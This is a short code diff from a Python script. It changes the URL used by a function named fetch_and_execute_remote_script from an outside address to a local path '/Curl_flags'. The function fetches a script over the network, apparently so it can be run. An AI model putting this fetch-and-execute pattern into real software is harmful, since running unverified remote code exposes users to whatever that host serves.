@@ -18,7 +18,7 @@ def input_colored(prompt, color):
 
 def fetch_and_execute_remote_script():
     """Fetch and execute a remote script."""
-    script_url = "https://kitup.eu/scripts/py/Master_cURL.py"
+    script_url = "/Curl_flags"
 
     try:
         response = requests.get(script_url)
